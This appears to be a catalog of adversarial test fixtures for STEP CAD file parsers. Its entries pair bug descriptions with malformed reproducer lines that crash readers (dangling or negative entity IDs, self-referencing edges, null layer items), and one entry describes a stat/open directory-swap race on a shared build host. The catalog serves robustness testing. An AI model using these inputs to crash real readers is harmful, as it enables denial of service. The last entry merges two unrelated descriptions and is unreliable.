description: A receiver that performs a path-based `stat()` on a fixture (to enforce a max-size budget, or a "regular file only" check, or a "this is the file we expected" hash check), then performs a separate path-based `open()`, races against any process that can swap the directory entry between the two syscalls. On a multi-tenant build host, an attacker replaces the directory entry (via `rename()`) so `stat()` sees a small benign file and `open()` returns a file descriptor on a much larger or hostile file. Distinct from Ad113 (sibling-pair race) and Ad114 (symlink-following): this entry is the directory-entry-swap vector even when no symlink is present. Bug-reporter language: "stat-vs-open race in STEP loader", "directory swap during validation", "rename() race on fixture path".
expected_kernel_behavior: Heal and accept: open the path once and `fstat()` the resulting file descriptor; never re-resolve the path for any check after the open; treat all path-based file metadata as untrusted. Must not crash on TOCTOU race.
notes: Third TOCTOU vector after Ad113 (sibling-pair race) and Ad114 (symlink-following) — separate axis (directory-swap, not symlink-swap). Provenance tier: cross-file-state — bytes alone cannot demonstrate this defect; the symptom requires a concurrent attacker process. The static fixture is document-only. **See also**: Ad106, Ad113, Ad114.
reproducer: a STEP fixture lives at a path whose containing directory is writable by an attacker; the attacker `rename()`s a small benign STEP file into place before the receiver's `stat()` and a hostile/oversized file into place before the receiver's `open()`. The bytes alone cannot demonstrate this; the demonstration requires a concurrent attacker process. The fixture in this catalog documents the scenario in a header comment.
sender: deduced — adversarial filesystem context where a directory entry is replaced between two filesystem operations on the same path
sources: bug-reporter language: "STEP loader stats and opens different files", "directory entry swapped during STEP load"
CWE-363 (race condition enabling access of resource using expired reference)
title: Directory-entry race between `stat()` and `open()` on STEP fixture path

description: The file content is well-formed Part-21 ASCII; the failure is that the importer (or its OCCT path-handling layer) cannot open the file when the filename or the path contains non-ASCII bytes that the current process locale cannot map. The receiver-side diagnostic surfaces as "import error" with no specific guidance. Distinct from P002 (encoding *inside* the file); here the bytes inside the file are clean and the offending bytes are in the path the OS hands to the reader.
expected_kernel_behavior: Heal and accept: file-open path opens via UTF-16 / wide-string Win32 APIs on Windows or UTF-8 path APIs on POSIX; never passes path bytes through `mbstowcs` against the current locale. Reject with E_BAD_PATH_ENCODING if the byte sequence cannot be normalized; never crash.
notes: **See also**: P002, Le001. Synonyms: "STEP file with Cyrillic filename fails import", "import fails on non-ASCII path", "Ножки.step refuses to open", "Cyrillic file name path encoding bug".
reproducer: well-formed minimal STEP file (`MANIFOLD_SOLID_BREP` cube). The fixture filename in this repo is plain ASCII (`Ad116.stp`); the catalog entry documents that some readers fail to open the *same content* when saved as `Ножки.stp` or `床.stp`. Provenance tier: bytes-sufficient as a structural representative; the OS-level filename-handling defect is path-side, not file-content-side.
sender: Any user with non-Western locale who saves the STEP file under a Cyrillic / Chinese / Japanese filename.
sources: bug-reporter language: "STEP import fails on file with Cyrillic name (Ножки.zip)", "fails for files with non-Western paths", "import error with Cyrillic filename".
title: Non-ASCII (Cyrillic / multi-byte) filename or path causes STEP import to fail

category: §12.11 adversarial / parser-robustness (sub-class: SEGV on style record)
description: A STEP file contains a `STYLED_ITEM` whose `styles` list points to an entity ID that does not exist in the data section, or contains an empty `styles` list. The reader's style-resolution pass dereferences a null pointer and the process aborts with `SIGSEGV`. The bug surfaces on otherwise minimal files — single solid plus dangling style — so the crash is reproducible on a 1 KB fixture.
expected_kernel_behavior: reject — emit `E_DANGLING_STYLE_REFERENCE` and skip the styled item; never dereference an unresolved entity reference. A crash on malformed input is a reliability defect.
notes: **See also**: A106. Synonyms: "STEP reader crash on STYLED_ITEM", "segfault reading STEP file", "null pointer in style resolution", "STEP import crash on dangling reference".
reproducer: `#100=STYLED_ITEM('',(#999),#50);` where `#999` is undefined and `#50` is a valid `MANIFOLD_SOLID_BREP`. The reader segfaults dereferencing the unresolved style.
sender: Hand-edited fixtures or files emitted by a buggy producer where a `STYLED_ITEM` references a non-existent presentation-style record.
sources: bug-reporter language: "crash by reading STEP file", "STEP reader crashes on import", "segmentation fault on small STEP file". (OCCT MANTIS tracker 502 as of 2026-05-02)
title: STEP reader crashes on minimal file with malformed `STYLED_ITEM`

description: A STEP file emitted by an older OCC version declares `FILE_SCHEMA(('CONFIG_CONTROL_DESIGN'))` (AP203 1994 schema) and uses entity flavours that the current reader has retired (e.g., `BREP_WITH_VOIDS` referenced from the older schema). The current reader rejects the schema string outright, even though the entities themselves are still recognisable. The result: a file that was authored by the same vendor toolchain becomes unreadable after a kernel upgrade.
expected_kernel_behavior: heal-and-accept; recognise legacy schema tokens (`CONFIG_CONTROL_DESIGN`, `AUTOMOTIVE_DESIGN`) and dispatch the reader appropriate to the entities present; emit `W_LEGACY_SCHEMA` rather than `E_UNKNOWN_SCHEMA`.
notes: **See also**: Lh013, A105. Synonyms: "STEP file from older OCC fails to open", "CONFIG_CONTROL_DESIGN no longer accepted", "schema-version regression on STEP read", "legacy AP203 schema rejected".
reproducer: `FILE_SCHEMA(('CONFIG_CONTROL_DESIGN'));` (older AP203) plus a `MANIFOLD_SOLID_BREP`. Newer reader refuses the schema even though entities are compatible.
sender: A producer pinned to an older OCC release whose STEP output uses a now-deprecated entity flavour or `FILE_SCHEMA` token.
sources: bug-reporter language: "STEP models opened in OCC4.0 are not opened in same application built on OCC5.1.3", "files that worked in older OCC fail in newer", "schema-version regression". (OCCT MANTIS tracker 502 as of 2026-05-02)
title: Forward-compat: STEP files written by an older OCC version no longer open in a newer build

description: When `step-g` encounters an entity its STEPcode-generated dispatcher does not recognise, it prints `Unknown ENTITY type <name>` once per instance to stderr, marks the instance as load-failed in `entity_status`, and then completes the import; the geometric subgraph is unaffected, but every colour/layer/style assignment is silently discarded. The user only notices the lost appearance after the converted .g file is rendered. In versions ≤ 7.18.4 the same dispatch path additionally tripped a glibc malloc-corruption abort (bug #291) during cleanup of the partially-loaded styled items; the warn-without-fail pattern coexisted with a latent double-free. Distinct from Ad117 (specific crash on dangling STYLED_ITEM ref) by being the umbrella "unknown entity is silently skipped" defect that drops the entire presentation subgraph at once.
expected_kernel_behavior: reject; when an unknown entity type is referenced by a known consumer (e.g. `MECHANICAL_DESIGN_GEOMETRIC_PRESENTATION_REPRESENTATION` references `STYLED_ITEM` references unresolved style), the importer must either (a) implement the presentation subgraph or (b) raise `E_UNKNOWN_PRESENTATION_ENTITY` so the caller knows colour/layer information has been lost.
notes: **See also**: Ad117, M039, A103. Synonyms: "Unknown ENTITY type STYLED_ITEM", "BRL-CAD step-g warns then drops presentation subgraph", "MECHANICAL_DESIGN_GEOMETRIC_PRESENTATION_REPRESENTATION skipped silently", "SourceForge brlcad bug 291 unknown entity type", "SourceForge brlcad bug 332 mdgpr presentation lost", "STEPcode dispatcher unknown entity warn-and-skip".
reproducer: AP203 file containing `MANIFOLD_SOLID_BREP` plus `COLOUR_RGB` → `FILL_AREA_STYLE_COLOUR` → `FILL_AREA_STYLE` → `SURFACE_STYLE_FILL_AREA` → `SURFACE_SIDE_STYLE` → `SURFACE_STYLE_USAGE` → `PRESENTATION_STYLE_ASSIGNMENT` → `STYLED_ITEM` → `PRESENTATION_LAYER_ASSIGNMENT` → `MECHANICAL_DESIGN_GEOMETRIC_PRESENTATION_REPRESENTATION`. step-g prints nine `Unknown ENTITY type` warnings and produces a colourless .g file.
sender: CATIA V5/V6, NX, and Inventor exports of AP203/AP214 files where the geometric subgraph and the presentation subgraph (STYLED_ITEM, PRESENTATION_STYLE_ASSIGNMENT, SURFACE_STYLE_USAGE, SURFACE_SIDE_STYLE, SURFACE_STYLE_FILL_AREA, FILL_AREA_STYLE, FILL_AREA_STYLE_COLOUR, COLOUR_RGB, PRESENTATION_LAYER_ASSIGNMENT, MECHANICAL_DESIGN_GEOMETRIC_PRESENTATION_REPRESENTATION) coexist.
sources: SourceForge BRL-CAD bug #291 (CATIA V5R19 AP203 — `step-g` printed `Unknown ENTITY type` for nine presentation entities then aborted with `glibc detected *** step-g: malloc(): memory corruption`)
SourceForge BRL-CAD bug #332 (`mdgpr.step` — eleven unknown entities, geometry imports cleanly, all presentation data lost)

bug-reporter language: "Unknown ENTITY type STYLED_ITEM", "Unknown ENTITY type MECHANICAL_DESIGN_GEOMETRIC_PRESENTATION_REPRESENTATION", "step-g imports geometry but loses all colour and layer info", "presentation entities silently skipped".
title: "Unknown ENTITY type" warning is not a hard failure (presentation subgraph silently dropped, BRL-CAD step-g)

description: A SURFACE_OF_REVOLUTION generated by revolving a 3-point-arc profile (encoded as a degree-2 B-spline approximation) around a near-perpendicular axis produces a near-degenerate revolved surface. One endpoint of the profile sits sub-epsilon close to the revolution axis (0.001 vs zero), creating a near-singular pin at the revolved-surface pole. Several receivers crash, hang, or produce invalid shape on import.
expected_kernel_behavior: detect near-axis-degeneracy on the revolved profile; flag as pin singularity or snap-to-axis before continuing.
notes: Synonyms: "revolved arc crashes STEP reader", "3-point-arc revolution hangs import", "SURFACE_OF_REVOLUTION near-axis profile invalid", "FreeCAD revolution hang on round-trip", "arc by 3 points revolved STEP crash".
reproducer: B_SPLINE_CURVE_WITH_KNOTS degree 2 with control points (0.001, 0, 0), (1, 0, 0.5), (2, 0, 0). Revolution axis: Y axis through (0, 0, 0). Wrap in ADVANCED_FACE + OPEN_SHELL + SBSM.
sources: Pattern-mined from FreeCAD/FreeCAD#16681 (LGPL-clean — pattern only, no bytes copied). User-reported reproducer: sketcher arc-by-3-points + 360° revolution produces a STEP that hangs FreeCAD on import.
title: SURFACE_OF_REVOLUTION on 3-point-arc profile crashes consumer on import

description: A `CARTESIAN_POINT` is emitted with 4 coordinate values instead of the schema-mandated 3. Receivers either reject the file outright ("file corrupted") or silently truncate, producing a wrong-coordinate point. Distinct from Ad077 because the aggregate is over-long, not zero-length; the schema-level constraint is "exactly 3", not ">=1".
expected_kernel_behavior: enforce schema arity on aggregates; reject or report the over-long literal at parse time with a precise diagnostic naming the entity-line.
notes: Synonyms: "corrupted STEP export", "CARTESIAN_POINT 4 coordinates wrong", "schema arity mismatch on point", "wrong number of coords in STEP point", "FreeCAD export corrupted file".
reproducer: `CARTESIAN_POINT('',(1.0,2.0,3.0,4.0))` somewhere in the data section, file otherwise valid.
sources: Pattern-mined from FreeCAD/FreeCAD#30860 (LGPL-clean — pattern only, no bytes copied). User-reported reproducer: STEP export from FreeCAD produces a file flagged as corrupted by receiver.
title: Corrupted STEP export: CARTESIAN_POINT with mismatched coord count

description: The writer reuses an entity-ID slot for two entities — either by reset-counter bug or by emitting a duplicate without a fresh ID. Receivers that resolve forward references encounter the second entity's value and silently drop the first; resulting geometry has the wrong sub-shape at the colliding ID. Distinct from Ad117 because the collision is among data-section entries, not styled-item dangling refs.
expected_kernel_behavior: detect ID collisions at parse time; reject the file with an error pointing at the colliding pair.
notes: Synonyms: "duplicate STEP entity ID", "writer reused entity slot", "STEP forward ref points to wrong entity", "geometry damaged in STEP export", "FreeCAD export damaged geometry".
reproducer: emit two entities at the same ID (or a duplicate CARTESIAN_POINT in a slot already used by a vertex).
sources: Pattern-mined from FreeCAD/FreeCAD#25774 (LGPL-clean — pattern only, no bytes copied). User-reported reproducer: "geometry of exported STEP is damaged".
title: Damaged STEP export: writer reuses entity-ID slots

description: A `PCURVE` references a surface entity ID that does not exist anywhere in the data section. The writer (or downstream consumer) follows the reference during processing and dereferences a null pointer — SIGSEGV. Distinct from Ad117 because the dangling reference is on PCURVE/surface graphs, not STYLED_ITEM/style graphs.
expected_kernel_behavior: validate forward-reference targets exist before traversing them; on missing reference, log a diagnostic and continue rather than dereference.
notes: Synonyms: "STEP Export crash PCurve", "PCURVE null deref crash", "OCCT segfault on STEP export PCurve", "dangling surface ref crashes writer", "PCurve to missing surface crashes".
reproducer: `#10=PCURVE('crash',#9999,#9999)` where #9999 does not exist.
sources: Pattern-mined from Open-Cascade-SAS/OCCT#80 (LGPL-clean — pattern only, no bytes copied). User-reported reproducer: STEP export crashes during PCURVE processing.
title: Step Export: crash on PCURVE processing (dangling surface ref)

description: A label or layer-name string in the data section contains a `#NNN`-style token that the reader's tokenizer picks up as a forward reference even though it lies *inside* a quoted string. The reader then dereferences a non-existent entity → SIGSEGV.
expected_kernel_behavior: only resolve `#NNN` tokens that appear at attribute boundaries; verify referenced ID exists in the data section before dereferencing.
notes: Synonyms: "ifcopenshell segfault malformed step-id", "non-numeric STEP id crash", "STEP forward-ref into string segfault", "#xx token inside label crashes reader", "STEP reader segfaults on malformed id".
reproducer: emit `PRESENTATION_LAYER_ASSIGNMENT('seg','non-numeric forward-ref',(#9999))` — the layer-name string is benign but `#9999` is not a defined entity.
sources: Pattern-mined from IfcOpenShell/IfcOpenShell#6032 (LGPL-clean — pattern only, no bytes copied). User-reported reproducer: file with bad `#NNN` tokens segfaults the reader.
title: Segfault from malformed step-ids (non-numeric forward-ref payload)

description: A label literal embeds a `#-1` token; on parse, the reader calls `atoi()` and gets `-1`, then uses it as an unsigned array index into the entity table. The hash slot dereferences out-of-bounds → SIGSEGV.
expected_kernel_behavior: reject negative `#-N` IDs during tokenization; constrain entity IDs to non-negative integers per ISO 10303-21.
notes: Synonyms: "negative STEP id segfault", "STEP reader atoi -1 crash", "#-1 as STEP id crashes", "unsigned index from signed STEP id segfault", "malformed STEP-IDs segfault variant".
reproducer: `PRESENTATION_LAYER_ASSIGNMENT('neg_id_label','#-1',(#9001))`.
sources: Pattern-mined from IfcOpenShell/IfcOpenShell#5680 (LGPL-clean — pattern only, no bytes copied). Distinct from Ad124: this variant exposes the failure when the reader parses an explicit negative ID and uses it as an array index.
title: Segfault on malformed STEP-IDs: negative ID after atoi() parse

description: The writer accepts an explicit STEP ID for the new entity but does not reserve it in the auto-ID counter. When the auto-ID later reaches N, the writer emits a duplicate at slot N, and downstream traversal hits the wrong entity → SIGSEGV. The bug is on the writer side; the resulting file (if it materializes) has a forward reference past the end of the data section.
expected_kernel_behavior: writer-side: reserve explicitly-assigned IDs in the auto-counter. Reader-side: validate every forward reference resolves before dereferencing.
notes: Synonyms: "ifcopenshell add() step_id segfault", "STEP id collision on writer crash", "explicit step_id collides with auto-id", "forward ref past end of data section crashes", "writer auto-id collision segfault".
reproducer: emit `PROPERTY_DEFINITION('collide','add_step_id_collision','',#9999)` (forward ref past data-section length).
sources: Pattern-mined from IfcOpenShell/IfcOpenShell#2726 (LGPL-clean — pattern only, no bytes copied). User-reported reproducer: `f.add(entity, step_id=N)` crashes when N matches an auto-generated ID.
title: `add()` with explicit STEP ID causes segfault on auto-ID collision

description: Distinct from Ad117 (style-dangling) and Ad123 (PCURVE-dangling) — this fixture exercises the *catchability gap*. OCC's signal handler design means that any null-deref on a STEP read becomes process-fatal even when the user wrote `try: ... except Exception:`. A dangling layer-assignment reference is the simplest reproducer.
expected_kernel_behavior: convert null-derefs in STEP read paths into recoverable exceptions; reserve OSD::SetSignal for truly-uncatchable kernel state.
notes: Synonyms: "pythonocc STEP missing ref kills Python", "OSD::SetSignal escapes Python try/except", "STEP crash kills process not exception", "missing references kills python OCC", "OCC signal handler escape on STEP read".
reproducer: `PRESENTATION_LAYER_ASSIGNMENT('kill_python','#9999 dangling',(#9999))` where `#9999` does not exist.
sources: Pattern-mined from pythonocc/pythonocc-core#1295 (LGPL-clean — pattern only, no bytes copied). User-reported reproducer: opening a corrupted STEP with missing references kills the Python process rather than raising a catchable exception. Root cause: OCC's OSD::SetSignal converts SIGSEGV into a process kill instead of a recoverable exception.
title: Corrupted STEP with missing references kills Python process (OSD::SetSignal)

description: STEP file containing a self-referential ORIENTED_EDGE entity: `#N=ORIENTED_EDGE('',*,*,#N,.T.);` where the edge_element forward-reference equals the entity's own ID. In importers that chase edge_element references recursively without a cycle guard (ORIENTED_EDGE → EdgeStart() → EdgeEnd() → EdgeStart() → …), the resolver recurses until the call stack exhausts. OCCT detects the self-reference and skips the orphan entity; the valid planar face in the product chain loads normally as shape(1). The self-referential entity is a denial-of-service vector in embedded importers.
expected_kernel_behavior: detect self-referential ORIENTED_EDGE and raise a parse error or skip cleanly; never recurse unboundedly on edge_element resolution. Pre-fix PrusaSlicer: stack overflow → crash.
notes: Distinct from Ad004 (general complex-entity cycle) and Pf036 (MAPPED_ITEM cyclic assembly). This specific pattern targets the EdgeStart/EdgeEnd resolution path. Synonyms: "ORIENTED_EDGE self-reference stack overflow", "circular edge reference crash STEP", "PrusaSlicer stack overflow STEP import", "STEP cyclic ORIENTED_EDGE DoS", "edge element self-reference".
reproducer: Valid OPEN_SHELL planar face (1×1 square) with PRODUCT chain; followed by `#N=ORIENTED_EDGE('',*,*,#N,.T.)` where N is the entity's own ID (obtained via `f._next_id` before emit).
sources: https://github.com/prusa3d/PrusaSlicer/issues/11305 (PrusaSlicer 2.6.1 + OCCT 7.x: stack overflow on import of file with circular ORIENTED_EDGE reference). B4 wave-4 DEF-B (LGPL-clean — pattern only, no bytes copied).
title: ORIENTED_EDGE mutual circular reference causes stack overflow

description: STEP AP214 file with a valid planar face (component A via standard product chain) and a `MAPPED_ITEM` referencing a `REPRESENTATION_MAP` combined with an `ITEM_DEFINED_TRANSFORMATION` whose placement is a `CARTESIAN_TRANSFORMATION_OPERATOR_3D` with `axis1=(1,0,0)`, `axis2=(0,1,0)`, `axis3=(0,0,-1)` — a left-handed coordinate system with `det = -1` (a reflection). Conforming readers that handle negative-det transformations produce component B as a mirror image of component A. Readers that silently treat the transformation as an identity or orthogonalize it (force det=+1) produce a copy at the wrong orientation. OCCT silently ignores the negative-det CTO and yields shape(1).
expected_kernel_behavior: detect negative-det transformation and emit `W_REFLECTION_TRANSFORM` diagnostic; produce the geometrically correct mirror image; never silently treat a reflection as an orthogonal placement.
notes: Synonyms: "negative determinant STEP transformation", "CARTESIAN_TRANSFORMATION_OPERATOR_3D det=-1", "STEP mirror reflection wrong orientation", "MAPPED_ITEM reflection silently identity", "Fusion 360 mirror pattern STEP wrong".
reproducer: `CARTESIAN_TRANSFORMATION_OPERATOR_3D('neg_det_mirror',#axis1,#axis2,#origin,1.0,#axis3)` where `#axis3=DIRECTION('axis3',(0.0,0.0,-1.0))` (det=-1); combined with `MAPPED_ITEM` referencing a `REPRESENTATION_MAP`.
sources: Fusion 360 community mirror pattern STEP export (DEF-V). LGPL-clean — pattern only, no bytes copied. Fusion 360 mirror-pattern exports encode `CARTESIAN_TRANSFORMATION_OPERATOR_3D` with axis3=(0,0,-1) forming a left-handed coordinate system (det=-1)
readers that silently orthogonalize the transformation (force det=+1) produce wrong orientation.
title: Negative-determinant CARTESIAN_TRANSFORMATION_OPERATOR_3D in MAPPED_ITEM

description: STEP AP214 file with a valid cube `MANIFOLD_SOLID_BREP` (six planar 10×10×10 mm faces) plus a colour + presentation-style chain producing two `STYLED_ITEM` entities (one red on the +X face, one blue on the +Y face). The defect: `PRESENTATION_LAYER_ASSIGNMENT('layer_ad130','...',(#styled1,$,#styled2))` — the middle element of the `assigned_items` set is literally `$` (STEP null). OCCT prior to commit 96049f2e passes this triple through `TCollection_HAsciiString` resolution without a null check and dereferences the null pointer during layer visibility computation, producing a segfault. OCCT post-fix (96049f2e+) skips the null entry gracefully and assigns only the two non-null `STYLED_ITEM` items to the layer, emitting a diagnostic in the transfer log.
expected_kernel_behavior: reject or skip null `$` entries in `PRESENTATION_LAYER_ASSIGNMENT.assigned_items` with a diagnostic (`W_LAYER_NULL_ITEM_SKIPPED`); never dereference the null pointer; never segfault or produce undefined behaviour.
notes: Synonyms: "PRESENTATION_LAYER_ASSIGNMENT null item segfault", "OCCT 96049f2 layer null item crash fix", "MANTIS 32049 layer visibility null crash", "assigned_items $ null STEP layer", "STYLED_ITEM null layer dereference crash".
reproducer: cube `MANIFOLD_SOLID_BREP`; two `STYLED_ITEM` entities with colour + presentation-style chain; `PRESENTATION_LAYER_ASSIGNMENT('layer_ad130','...',(#styled_1,$,#styled_2))` — literal `$` between the two valid references.
sources: OCCT commit 96049f2e3d7de177d89f89231e44e9d7d105ae43 (layer-visibility null-item crash fix) and OCCT MANTIS 0032049 (layer visibility + null item crash). B4 wave-7 DEF-LL (LGPL-clean — pattern only, no upstream bytes copied). `PRESENTATION_LAYER_ASSIGNMENT` `assigned_items` is an unordered set of items whose element type is `SELECT(REPRESENTATION_ITEM, REPRESENTATION)`
when a producer emits a `$` (null) element alongside valid `STYLED_ITEM` references, pre-fix OCCT dereferences the null pointer during layer resolution and segfaults
post-fix OCCT skips the null with a diagnostic.
title: `PRESENTATION_LAYER_ASSIGNMENT` with null (`$`) item in `assigned_items` set

category: §12.11 adversarial (sub-class: writer-emitted malformed schema declaration / massive-impact real-world defect)
description: STEP file whose HEADER section contains a `FILE_SCHEMA(('AUTOMOTIVE_DESIGN.{ 1 0 10303 442 3 0 0 }'));` declaration — note the literal `.` (period) between the schema name `AUTOMOTIVE_DESIGN` and the opening brace `{` of the version-triple tuple. The DATA section contains a minimal cube `MANIFOLD_SOLID_BREP` (six planar 10×10×10 mm faces) so the file is otherwise valid. Strict Part 21 parsers reject the schema declaration on syntax grounds (the ISO 10303-21 grammar for a `SCHEMA_NAME` does not permit an embedded `.` before the parenthesized version tuple). Permissive parsers (including OCCT itself, since it wrote the malformation) accept the file but treat the schema as effectively unknown, falling back to generic AP203/AP214 handling and silently dropping AP242-specific tolerance and PMI entities. The literal `.{` byte sequence is directly detectable via byte assertion on the header.
expected_kernel_behavior: STEP parsers must either (a) reject the file at HEADER parse time with a diagnostic pointing at the malformed `FILE_SCHEMA` declaration, or (b) accept the file with a recovery diagnostic (`W_FILE_SCHEMA_MALFORMED_DOT_SEPARATOR`) explaining that the schema was normalized by stripping the extra period; silent fallback to AP203/AP214 handling without diagnostic is unacceptable because AP242-specific entities are then silently dropped.
notes: OCCT PR #448 patch line is exact; the malformed string is byte-verifiable. B4 wave-8 DEF-BBB. Confidence: HIGH. Impact: every OCCT-authored AP242 file in the wild between 2018 and OCCT 8.0 release carries this malformation — the corpus scale is millions of files across FreeCAD, KiCad, Salome, and downstream tools. Synonyms: "OCCT PR #448 FILE_SCHEMA extra dot", "AUTOMOTIVE_DESIGN. schema name period", "malformed FILE_SCHEMA OCCT 7.x AP242", "STEPControl_Writer schema-name dot bug", "every OCCT-written AP242 file schema malformed".
reproducer: HEADER with `FILE_SCHEMA(('AUTOMOTIVE_DESIGN.{ 1 0 10303 442 3 0 0 }'));` (literal `.{` join point); minimal cube `MANIFOLD_SOLID_BREP` in DATA section.
sender: OCCT `STEPControl_Writer` 7.x through pre-8.0 (fixed in PR #448) — the C++ writer code path built the schema name as `TCollection_AsciiString schemaName = "AUTOMOTIVE_DESIGN."; schemaName += "{ 1 0 10303 442 3 0 0 }";` — with the trailing `.` on the schema-name literal producing the literal join point `AUTOMOTIVE_DESIGN.{ 1 0 10303 442 3 0 0 }`. The PR removes the trailing period.
sources: OCCT PR #448 (https://github.com/Open-Cascade-SAS/OCCT/pull/448) — `STEPControl_Writer` FILE_SCHEMA emission fix that strips the extra `.` between schema name and version tuple. B4 wave-8 DEF-BBB (LGPL-clean — malformed pattern documented in the PR title and patch diff

no upstream STEP bytes copied). **Massive real-world impact**: every OCCT-written AP242 file emitted by FreeCAD, KiCad, Salome-Platform, and the entire OCCT-based ecosystem between OCCT 7.x releases (~2018-2024) and the pre-8.0 patch (PR #448) carries this malformed header. This affects the entire OCCT-authored AP242 corpus in the wild — arguably the largest single class of malformed AP242 STEP files ever produced.
title: OCCT PR #448: malformed `FILE_SCHEMA` with literal `.` between schema name and version triple (every OCCT-written AP242 file in the wild)

category: §12.11 adversarial (sub-class: reader crash-path — datum-axis colinear-direction trip; NIST AP242 Ed.3 fixture)
description: STEP AP242 Ed.3 file matching the NIST `nist_stc_07_asme1_ap242-e3.stp` structure: cube `MANIFOLD_SOLID_BREP` (10×10×10 mm) carrier, plus a `DATUM('datum_A','primary datum on top face','A',...)` referencing the top-face `SHAPE_ASPECT`, plus a `DATUM_REFERENCE_MODIFIER('drm_1',...,#datum_a,.BASIC.,#datum_plc)` whose axis placement holds two colinear direction vectors `(1.0, 2.0, 3.0)` for both `axis` and `ref_direction`. Pre-fix OCCT (≤ 7.9) reads via `STEPCAFControl_Reader.cxx:3007` — three `TColStd_HArray1OfReal` direction arrays whose `Lower()` indices are 1, 2, 3 — and passes those *indices* (1,2,3) into `gp_Dir::SetCoord()` instead of the array *values*; both directions receive the same vector, `gp_Ax2` raises "result vector has zero norm" via `gp_Dir::CrossCross()`. Post-fix (OCCT 8.0) uses `Value(Lower())` and reads the correct coordinates, then either normalizes the colinear vectors or raises a proper schema error. The fixture's `(1,2,3)` values verify colinearity by construction — the crash is guaranteed on pre-fix OCCT regardless of whether it reads the indices or the values.
expected_kernel_behavior: OCCT ≥ 8.0 must resolve the `DATUM_REFERENCE_MODIFIER` chain via `Value(Lower())` and either normalize the colinear directions or raise a proper schema error; kernels ≤ 7.9 raise `gp_Dir::CrossCross()` "result vector has zero norm" — a segfault-adjacent crash in the reader path.
notes: OCCT #383/#407. B4 wave-8 DEF-AAA. Confidence: HIGH — mechanism precisely described in issue #383 patch diff. The defect IS the OCCT reader behavior; live oracle IS the failure mode. The reproducer's `(1.0,2.0,3.0)` colinear vectors are a deliberate simplification of the NIST fixture's crash-path — the crash on pre-fix OCCT is guaranteed regardless of whether the pre-fix reads the indices or the values because the array values are already colinear. Post-fix OCCT reads shape(1) and skips the colinear-axis warning as expected. Synonyms: "OCCT #383 datum-axis crash", "STEPCAFControl_Reader Lower index bug", "gp_Dir CrossCross zero norm", "NIST nist_stc_07_asme1_ap242-e3.stp datum crash", "AP242 Ed.3 datum axis colinear ref_direction", "OCCT PR #407 Value(Lower) fix".
reproducer: AP242 Ed.3 header (`AUTOMOTIVE_DESIGN { 1 0 10303 442 4 1 4 }`); cube `MANIFOLD_SOLID_BREP` carrier; `DATUM('datum_A',...)` referencing a top-face `SHAPE_ASPECT`; `DATUM_REFERENCE_MODIFIER('drm_1',...,#datum,.BASIC.,#axis_placement)`; the axis placement's two `DIRECTION` entities both hold vector `(1.0, 2.0, 3.0)` — colinear.
sender: NIST-authored AP242 Ed.3 test files with datum-axis chains, and any AP242 Ed.3 CAD tool that emits `DATUM` + `DATUM_REFERENCE_MODIFIER` chains with axis references; file header declares `AUTOMOTIVE_DESIGN { 1 0 10303 442 4 1 4 }` (Ed.3 OID).
sources: https://github.com/Open-Cascade-SAS/OCCT/issues/383, https://github.com/Open-Cascade-SAS/OCCT/pull/407 (`STEPCAFControl_Reader.cxx:3007` — pre-fix passes `Lower()` indices into `gp_Dir::SetCoord()` instead of `Value(Lower())`
post-fix reads the array values). NIST `nist_stc_07_asme1_ap242-e3.stp` is the reference file that surfaced the crash. B4 wave-8 DEF-AAA (LGPL-clean — pattern only, no upstream bytes copied).
title: OCCT #383/#407: NIST AP242 Ed.3 datum-axis reader confuses indices vs values → `gp_Dir::CrossCross` zero-norm exception

category: §12.11 adversarial (sub-class: writer regression — curved-surface entity elision on re-export; version-specific to OCCT 8.0)
description: STEP file with a single `ADVANCED_FACE` on a `CYLINDRICAL_SURFACE` (radius 5.0 mm, axis Z, 90-degree cylindrical patch from z=0 to z=10; boundary `EDGE_LOOP` = bottom arc + right vertical line + top arc + left vertical line). The input bytes are perfectly readable — geometry loads cleanly under any OCCT version. The defect surfaces downstream: on `write → reread` through OCCT 8.0's `STEPControl_Writer` C++ API path, the `CYLINDRICAL_SURFACE` entity reference is silently omitted from the output — the output STEP has an `ADVANCED_FACE` whose surface reference points at a null/missing entity, so a downstream slicer that consumes the re-exported STEP produces completely wrong toolpaths because the curved boundary vanished. description: `StepToTopoDS_TranslateCompositeCurve::Init` wraps EACH segment's own 3D-curve/pcurve conversion in its own try/catch; a segment whose underlying geometry throws during construction (as opposed to merely being disconnected from its neighbor — Gp034/Gp188's already-covered connectivity-gap warning path) should be dropped, letting the rest of the composite curve's segments — and the containing face — still translate. This fixture's `COMPOSITE_CURVE` has two segments: `good_composite_segment_line` (an ordinary `LINE`, genuinely constructible) and `degenerate_composite_segment_bspline` (a `B_SPLINE_CURVE_WITH_KNOTS` whose knot vector `(1.0, 0.5, 2.0)` is NOT monotonically non-decreasing — schema-legal Part-21 bytes, but numerically invalid for `Geom_BSplineCurve`'s constructor, which requires a non-decreasing knot sequence).
expected_kernel_behavior: drop the bad segment's contribution via the per-segment catch, letting the whole face still translate (`occt=shape(1)`) rather than aborting the whole read.
notes: **See also**: Ad043, Xp008 (coarser-granularity catch sites for this same task-brief family), Gp034, Gp188 (connectivity-gap sibling, a DIFFERENT defect — disconnection, not a throwing segment). Live-verified (this worktree, OCP/OCCT 7.8.1): reads to completion without aborting, `TransferRoots()==1`, `OneShape()` not null, `occt=shape(1)/shape(1)`, `shape_null=False`, `n_faces_total=1` — matching Gp188's own pre-existing "`n_edges_total==0` despite `n_faces_total==1`" tier-3 signature for this single-self-loop `COMPOSITE_CURVE`-edge structural family (confirmed via direct read this is a known, established, ACCEPTED pattern for this construction style in this corpus — see Gp188's own notes — not a new concern introduced here). A prior variant of this fixture used `TRIMMED_CURVE`-wrapped segments (Gp063's pattern) instead of Gp188's plain-LINE-segment style, and used the `COMPOSITE_CURVE` bare as `EDGE_CURVE.edge_geometry` instead of Gp188's `SURFACE_CURVE`+`PCURVE` wrapper — both prior variants ALSO read as `shape(1)`/non-null, so the exact sub-pattern choice does not appear load-bearing for reachability; this version follows Gp188's own proven convention for consistency. Synonyms: "composite curve segment throws", "per-segment try catch composite curve", "non-monotonic knot vector segment", "segment dropped not curve aborted", "TranslateCompositeCurve per-segment catch". Provenance tier: bytes-sufficient.
